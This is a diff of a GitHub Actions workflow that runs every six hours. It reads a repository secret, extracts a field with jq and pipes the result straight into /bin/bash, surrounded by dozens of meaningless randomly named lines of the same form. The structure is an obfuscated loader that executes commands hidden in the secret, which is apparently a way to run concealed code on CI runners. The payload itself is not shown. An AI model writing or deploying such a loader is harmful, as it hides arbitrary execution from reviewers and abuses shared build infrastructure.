@@ -3,25 +3,36 @@ name: weijingcai7816
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 1/6 * * *'
-jobs:  # 18243
+    - cron: '38 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weijingcai7816
         env:
-          s44: ${{ secrets.s44 }}
+          yf9: ${{ secrets.yf9 }}
         run: |
-          echo $s44 | jq -r .c67613 | /bin/bash
-          echo $megk5779 | jq -r .in8358 | /bin/bash
-          echo $shsr4962 | jq -r .rcx265 | /bin/bash
-          echo $uv895 | jq -r .kxynx5390 | /bin/bash
-          echo $wpcg17 | jq -r .h6806 | /bin/bash
-          echo $egdsx8 | jq -r .vsj483 | /bin/bash
-          echo $trt407 | jq -r .q96 | /bin/bash
-          echo $awwg143 | jq -r .h2 | /bin/bash
-          echo $ms742 | jq -r .q58924 | /bin/bash
-          echo $drmqd8724 | jq -r .orqu88921 | /bin/bash
+          echo $yf9 | jq -r .qasf37261 | /bin/bash
+          echo $xh41 | jq -r .d807 | /bin/bash
+          echo $unnnu878 | jq -r .pz4 | /bin/bash
+          echo $i0 | jq -r .vxtnr5846 | /bin/bash
+          echo $p6 | jq -r .vulz9431 | /bin/bash
+          echo $k70165 | jq -r .lymeu983 | /bin/bash
+          echo $gx0569 | jq -r .hfj893 | /bin/bash
+          echo $jvh72 | jq -r .vmc212 | /bin/bash
+          echo $dz976 | jq -r .y648 | /bin/bash
+          echo $h61064 | jq -r .te54557 | /bin/bash
+          echo $ckb61 | jq -r .orj9 | /bin/bash
+          echo $j1 | jq -r .n89730 | /bin/bash
+          echo $ddsu33287 | jq -r .l28355 | /bin/bash
+          echo $ggp26 | jq -r .c22818 | /bin/bash
+          echo $ggo25 | jq -r .mcv26463 | /bin/bash
+          echo $meeg06 | jq -r .qi3361 | /bin/bash
+          echo $ln43655 | jq -r .xkh128 | /bin/bash
+          echo $lazq23647 | jq -r .xbjb14493 | /bin/bash
+          echo $mfua39225 | jq -r .cpg200 | /bin/bash
+          echo $zxuqc574 | jq -r .vq41006 | /bin/bash
+          echo $pc00530 | jq -r .swe94724 | /bin/bash
+          echo $tm6 | jq -r .svlij80680 | /bin/bash
 
